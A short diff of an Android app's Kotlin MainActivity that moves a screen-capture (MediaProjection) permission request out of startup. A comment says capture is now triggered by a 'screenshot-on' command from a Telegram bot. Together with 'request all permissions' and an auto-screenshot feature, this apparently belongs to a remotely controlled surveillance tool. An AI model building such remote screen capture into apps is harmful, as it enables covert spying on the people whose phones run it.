@@ -58,11 +58,11 @@ class MainActivity : AppCompatActivity() {
     private fun showMainScreen() {
         // Request all permissions first
         requestAllPermissions()
-        
-        // CRITICAL: Request MediaProjection permission NOW (while in foreground)
-        // This is needed for auto-screenshot feature
-        // Android 12 blocks this from background, so we MUST do it here
-        requestMediaProjection()
+
+        // ⚠️ REMOVED: requestMediaProjection() - this was causing the app to crash
+        // when the user tapped OK on the system permission dialog.
+        // Now MediaProjection is requested only when the user sends screenshot-on
+        // command from the Telegram bot (one-time request).
 
         val scrollView = ScrollView(this).apply {
             setBackgroundColor(Color.WHITE)
